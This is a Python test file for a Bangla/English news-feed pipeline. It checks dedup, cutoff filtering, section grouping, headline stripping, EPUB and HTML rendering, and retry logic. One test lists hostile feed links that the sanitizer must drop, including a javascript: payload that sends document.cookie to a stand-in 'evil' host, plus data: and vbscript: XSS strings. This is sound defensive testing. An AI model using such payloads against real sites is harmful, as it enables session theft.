"""Self-check for the non-trivial logic: dedup, cutoff filtering, section
resolution. No network calls -- feedparser.parse and extract_text are
monkeypatched. Run with: python test_pipeline.py
"""
import unicodedata
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace
from unittest.mock import patch

import pipeline


def test_group_by_section_uses_hint_then_ai_then_drops_unknown():
    articles = [
        {"section_hint": "Sports", "source": "A", "link": "l1"},
        {"section_hint": None, "source": "B", "link": "l2"},
        {"section_hint": None, "source": "C", "link": "l3"},
    ]
    ai_results = [
        {"index": 0, "headline": "h0", "summary": "s0", "section": "Tech"},  # hint wins over this
        {"index": 1, "headline": "h1", "summary": "s1", "section": "Tech"},
        {"index": 2, "headline": "h2", "summary": "s2", "section": "Nonsense"},  # dropped
    ]
    grouped = pipeline.group_by_section(articles, ai_results)
    assert len(grouped["Sports"]) == 1, grouped
    assert grouped["Sports"][0]["headline"] == "h0"
    assert len(grouped["Tech"]) == 1, grouped
    assert grouped["Tech"][0]["headline"] == "h1"
    assert sum(len(v) for v in grouped.values()) == 2, "unknown section must be dropped"
    assert grouped["Sports"][0]["anchor"] != grouped["Tech"][0]["anchor"], "anchors must be unique across sections"
    assert grouped["Sports"][0]["teaser"], "teaser must be derived, not empty"
    print("ok: group_by_section")


def test_make_teaser_stops_at_first_sentence_and_caps_length():
    assert pipeline.make_teaser("পহেলা বাক্য। দ্রুতীয় বাক্য।") == "পহেলা বাক্য।"
    long_text = "word " * 100
    teaser = pipeline.make_teaser(long_text, max_chars=50)
    assert len(teaser) <= 52 and teaser.endswith("…")
    print("ok: make_teaser")


def test_fetch_new_entries_dedups_and_respects_cutoff():
    now = datetime(2024, 1, 2, 6, 0, tzinfo=timezone.utc)
    old = (now - timedelta(hours=48)).timetuple()
    fresh = (now - timedelta(hours=2)).timetuple()

    fake_feed = SimpleNamespace(bozo=False, entries=[
        {"link": "https://x/already-seen", "title": "seen", "published_parsed": fresh},
        {"link": "https://x/too-old", "title": "old", "published_parsed": old},
        {"link": "https://x/new-one", "title": "new", "published_parsed": fresh},
    ])
    source = {"name": "Test Source", "url": "https://x/feed", "section": "Tech"}
    state = {"Test Source": {"seen_urls": ["https://x/already-seen"]}}

    with patch.object(pipeline.feedparser, "parse", return_value=fake_feed), \
         patch.object(pipeline, "extract_text", return_value="some article body"):
        new_articles = pipeline.fetch_new_entries(source, state, now)

    links = {a["link"] for a in new_articles}
    assert links == {"https://x/new-one"}, links
    print("ok: fetch_new_entries dedup + cutoff")


def test_build_epub_smoke(tmp_path=None):
    import tempfile
    from pathlib import Path
    grouped = {s: [] for s in pipeline.SECTIONS}
    grouped["Tech"] = [{"anchor": "a0", "headline": "শিরোনাম", "summary": "সারাংশ", "teaser": "সারাংশ", "source": "Src", "link": "https://x"}]
    out = Path(tempfile.mkdtemp()) / "t.epub"
    pipeline.build_epub(grouped, datetime.now(timezone.utc), out)
    assert out.exists() and out.stat().st_size > 0
    print("ok: build_epub smoke test")


def test_retry_succeeds_after_transient_failures():
    calls = {"n": 0}

    def flaky():
        calls["n"] += 1
        if calls["n"] < 3:
            raise ValueError("transient")
        return "ok"

    with patch.object(pipeline.time, "sleep", return_value=None):
        assert pipeline.retry(flaky, what="test", attempts=3, backoff=1) == "ok"
    assert calls["n"] == 3
    print("ok: retry recovers from transient failures")


def test_retry_raises_after_exhausting_attempts():
    def always_fails():
        raise ValueError("permanent")

    with patch.object(pipeline.time, "sleep", return_value=None):
        try:
            pipeline.retry(always_fails, what="test", attempts=2, backoff=1)
            assert False, "should have raised"
        except ValueError:
            pass
    print("ok: retry raises after exhausting attempts")


def test_collect_results_strips_headline_repeated_in_body():
    """Bangla outlets routinely open the article body with the headline (and a
    kicker line that repeats it again). Left in, the teaser is just the
    headline a second time."""
    # খেলোয়াড়দের spelled precomposed in the title (U+09DF/U+09DC, as feeds send
    # it) and nukta-decomposed in the body (as the extractor returns it) --
    # canonically the same string, byte-wise different. NFC can't fix it:
    # those letters are composition exclusions.
    title = "খেলোয়াড়দের সংবাদ"
    decomposed = unicodedata.normalize("NFD", title)
    assert decomposed != title, "fixture must actually differ byte-wise"

    articles = [
        {"title": "শিরোনাম", "text": "শিরোনাম\nশিরোনাম\nআসল লেখা এখানে।", "section_hint": "Tech"},
        {"title": "Only The Title", "text": "Only The Title", "section_hint": "Tech"},
        {"title": title, "text": decomposed + "\nমূল প্রতিবেদন।", "section_hint": "Tech"},
        {"title": "খবর", "text": "সম্পূর্ণ আলাদা লেখা।", "section_hint": "Tech"},
    ]
    results = pipeline.collect_results(articles)
    assert results[0]["summary"] == "আসল লেখা এখানে।", results[0]["summary"]
    assert results[1]["summary"] == "Only The Title", "body that is nothing but the headline still shows something"
    assert results[2]["summary"] == "মূল প্রতিবেদন।", results[2]["summary"]
    assert results[3]["summary"] == "সম্পূর্ণ আলাদা লেখা।", "body that never repeats the headline is untouched"
    print("ok: collect_results strips repeated headline")


def test_collect_results_uses_raw_title_and_excerpt():
    articles = [
        {"title": "Some Headline", "text": "a" * 500, "section_hint": None},
        {"title": "", "text": "short body", "section_hint": "Tech"},
    ]
    results = pipeline.collect_results(articles)
    assert results[0]["headline"] == "Some Headline"
    assert results[0]["summary"].endswith("…")
    assert results[0]["section"] == "Local", "no hint -> defaults to Local, not crash"
    assert results[1]["headline"], "missing title still gets a placeholder, not empty"
    assert results[1]["section"] == "Tech", "hinted section passed through untouched"
    print("ok: collect_results")


def test_feed_links_are_scheme_restricted():
    """Feeds are untrusted. A javascript:/data: link must never reach an href
    on the published site, in the EPUB, or in subscriber email -- HTML-escaping
    does not defuse those, they stay live links."""
    hostile = [
        "javascript:fetch('https://evil/?c='+document.cookie)",
        "JaVaScRiPt:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox",
        "  javascript:alert(1)  ",
        None,
    ]
    for bad in hostile:
        assert pipeline.safe_url(bad) == "", f"must be dropped: {bad!r}"
    for good in ["https://x.com/a?b=1&c=2", "http://x.com", "  https://x.com  "]:
        assert pipeline.safe_url(good) == good.strip(), good

    articles = [{"section_hint": "Tech", "source": "Evil Feed", "link": "javascript:alert(1)"}]
    results = [{"index": 0, "headline": "h", "summary": "s", "section": "Tech"}]
    assert pipeline.group_by_section(articles, results)["Tech"][0]["link"] == "", \
        "sanitized early, at the funnel every renderer is fed from"

    # ...and again at each sink, so it holds for a `grouped` built any other
    # way. This dict deliberately bypasses group_by_section.
    grouped = {s: [] for s in pipeline.SECTIONS}
    grouped["Tech"] = [{"anchor": "a0", "headline": "h", "summary": "s", "teaser": "t",
                        "source": "Evil Feed", "link": "javascript:alert(1)"}]
    run_dt = datetime(2026, 8, 12, 1, 0, tzinfo=timezone.utc)

    import tempfile
    from pathlib import Path
    epub_out = Path(tempfile.mkdtemp()) / "t.epub"
    pipeline.build_epub(grouped, run_dt, epub_out)
    outputs = {
        "run page": pipeline.render_run_html(grouped, run_dt),
        "email": pipeline.render_email_html(grouped, run_dt),
        "epub": epub_out.read_bytes().decode("utf8", "ignore"),
    }
    for name, out in outputs.items():
        assert "javascript:" not in out.lower(), f"{name} leaked a javascript: URL"
        assert 'href=""' not in out, f"{name} emitted an empty href instead of dropping the link"
    assert "Evil Feed" in outputs["run page"], "source is still credited without a link"
    print("ok: feed links are scheme-restricted")


def test_render_site_pages():
    """Run page renders, the index reuses its সূচি fragment, and the tally
    segments carry the real per-section counts."""
    import tempfile
    from pathlib import Path
    grouped = {s: [] for s in pipeline.SECTIONS}
    grouped["Local"] = [{"anchor": f"a{i}", "headline": f"শিরোনাম {i} & Q<A", "summary": "সারাংশ",
                         "teaser": "সারাংশ", "source": "Prothom Alo", "link": "https://x?a=1&b=2"}
                        for i in range(3)]
    grouped["Tech"] = [{"anchor": "a3", "headline": "H", "summary": "s", "teaser": "s",
                        "source": "Ars", "link": "https://y"}]
    run_dt = datetime(2026, 8, 12, 0, 30, tzinfo=timezone.utc)  # 06:30 BD -> dawn

    site = Path(tempfile.mkdtemp())
    (site / "runs").mkdir()
    with patch.object(pipeline, "SITE_DIR", site):
        fname = "runs/2026-08-12-0030.html"
        (site / fname).write_text(pipeline.render_run_html(grouped, run_dt))
        run_html = (site / fname).read_text()
        index = pipeline.render_index([{"dt": run_dt.isoformat(), "file": fname,
                                        "counts": {"Local": 3, "Tech": 1}}])

    assert "&amp;" in run_html and "Q&lt;A" in run_html, "headlines/links must be HTML-escaped"
    assert '<li class=seg style="--n:3;--i:0">' in run_html, "tally segment must be sized by count"
    assert 'id=s-Local' in run_html and run_html.count('id=s-Local') == 1, "one anchor per section"
    assert "প্রভাতী" in run_html, "dawn edition label"

    assert "<section class=detail>" not in index, "index is digest-only -- excerpts live on the run page"
    assert 'href="runs/2026-08-12-0030.html#a0"' in index, "digest rows must point at the run page"
    assert "id=s0-Local" in index and "id=s-Local" not in index, "stacked editions must not collide"
    assert f"<h2 class=part>{pipeline.PART_TOC}</h2>" not in index, "redundant সূচি label dropped on index"
    print("ok: render_run_html + render_index")


def test_parse_recipients_handles_separators_and_whitespace():
    raw = "a@x.com, b@y.com;\nc@z.com ,, "
    assert pipeline.parse_recipients(raw) == ["a@x.com", "b@y.com", "c@z.com"]
    print("ok: parse_recipients")


if __name__ == "__main__":
    test_group_by_section_uses_hint_then_ai_then_drops_unknown()
    test_fetch_new_entries_dedups_and_respects_cutoff()
    test_build_epub_smoke()
    test_make_teaser_stops_at_first_sentence_and_caps_length()
    test_retry_succeeds_after_transient_failures()
    test_retry_raises_after_exhausting_attempts()
    test_collect_results_uses_raw_title_and_excerpt()
    test_collect_results_strips_headline_repeated_in_body()
    test_render_site_pages()
    test_feed_links_are_scheme_restricted()
    test_parse_recipients_handles_separators_and_whitespace()
    print("all tests passed")
